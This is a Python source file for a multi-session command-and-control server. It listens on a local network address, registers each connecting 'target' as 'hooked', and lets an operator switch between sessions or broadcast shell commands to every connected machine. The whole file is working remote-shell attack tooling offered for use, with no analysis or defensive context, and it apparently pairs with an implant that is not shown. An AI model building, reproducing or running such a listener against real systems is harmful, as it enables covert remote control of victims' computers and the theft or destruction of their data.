import select
import socket
import threading
import json
import os
import sys
import select


class Server:
    def __init__(self) -> None:
        # first argument tells to user ipv4 and the second tells to user tcp protocol
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.bind(("192.168.0.151", 5555))
        self.sock.listen()
        # ds to store data
        self.targetArr = []
        self.ipArr = []
        self.default_Ip = None
        self.default_target = None
        self.byt = 1024
        self.store = {}
        self.stop_event = threading.Event()
        self.communication_Thread = None

    # managing the data structure
    def manage_Store(self, target, ip):
        self.store[ip] = target
        self.ipArr.append(ip)
        self.targetArr.append(target)

    # active threads

    def active_Thread(self):
        return threading.active_count() - 1

    # send
    def reliable_Send(self, target, command):
        try:
            jsondata = json.dumps(command)
            target.send(jsondata.encode())
        except:
            print("[-] Error in reliable_Send")

    # send command to target system
    def reliable_receive(self, target):
        data = ""
        while True:
            try:
                data = data + target.recv(1024).decode().rstrip()
                return json.loads(data)
            except:
                return data

    # displaying all the avaiable sessions
    def sessions(self):
        print("---------------------------------------------------------------------")
        print("ID\t\t\tIPADDRESS")
        for i in range(0, len(self.ipArr), 1):
            print(f"{i}\t\t\t{self.ipArr[i]}")

    # handle session switch
    def handle_SessionSwitch(self):
        self.sessions()
        try:
            index = int(input("[+] Please enter session id: "))
            self.default_Ip = self.ipArr[index]
            self.default_target = self.targetArr[index]
        except:
            print("[-] SOMETHING WENT WRONG IN HANDLE SWITCH SESSION:")

    # broadcast
    def broadcast(self, command):
        for target in self.targetArr:
            self.reliable_Send(target, command)
            print(self.reliable_receive(target))

    def handle_Communication_1(self):
        print("[+] starting communication ", self.active_Thread())
        while not self.stop_event.is_set():
            command = input("Shell~%s:" % str(self.default_Ip))
            try:
                # send the command to the client
                if command == "quit":
                    self.broadcast("quit")
                    os._exit(0)
                if command == "":
                    continue
                if command == "session":
                    self.sessions()
                    continue
                if command == "switchsession":
                    self.handle_SessionSwitch()
                    continue
                self.reliable_Send(self.default_target, command)
                result = self.reliable_receive(self.default_target)
                print(result)
            except:
                print("[-] something went wrong handle communication")
        print("[+] handle_Communication has completed")

    def handle_Communication(self):
        print("[+] starting communication ", self.active_Thread())
        while not self.stop_event.is_set():
            command = input("Shell~%s:" % str(self.default_Ip))
            try:
                # send the command to the client
                if command == "quit":
                    self.broadcast("quit")
                    os._exit(0)
                if command == "":
                    continue
                if command == "session":
                    self.sessions()
                    continue
                if command == "switchsession":
                    self.handle_SessionSwitch()
                    continue
                # acquire the lock
                self.reliable_Send(self.default_target, command)
                while True:
                    # wait for incoming data on the socket
                    rlist, _, _ = select.select([self.default_target], [], [], 0.1)
                    print(f"[+] waiting for the response from {self.default_Ip}")
                    if rlist:
                        result = self.reliable_receive(self.default_target)
                        print(result)
                        break  # exit the loop once data is received
                    else:
                        # no data received yet, continue waiting
                        continue
            except:
                print("[-] something went wrong handle communication")
        print("[+] handle_Communication has completed")

    # start the server
    def start(self):
        print("[+] Starting the application.....")
        while True:
            # accept the incoming connection
            print("[+] Listening for incoming connection")
            target, ip = self.sock.accept()
            print(f"[+] Target connected from ip : {ip[0]} Hooked🪝")
            # for testing
            self.reliable_Send(target, "HOOKED ACK 🪝")
            print(self.reliable_receive(target))

            # add to store
            self.manage_Store(target, ip[0])

            if (
                self.communication_Thread is None
                or not self.communication_Thread.is_alive()
            ):
                # if its the firt target
                print("[+] First Session: ")
                self.default_Ip = ip[0]
                self.default_target = target
                self.stop_event.clear()
                self.communication_Thread = threading.Thread(
                    target=self.handle_Communication
                )
                self.communication_Thread.start()
            else:
                print(
                    "[+] Another target joined in reinitiating a new communication channel"
                )
                # else stop the previous thread and reinitiate a new thread to avoid any inconsistency
                # the enter is because of the input the handle communication which is blocking
                print("[+] Clearing up the previous thread press enter to initiate")
                self.stop_event.set()
                self.communication_Thread.join()
                self.stop_event.clear()
                print("[+] Starting a new Thread")
                sys.stdout.flush()
                self.communication_Thread = threading.Thread(
                    target=self.handle_Communication
                )
                self.communication_Thread.start()


if __name__ == "__main__":
    server = Server()
    server.start()
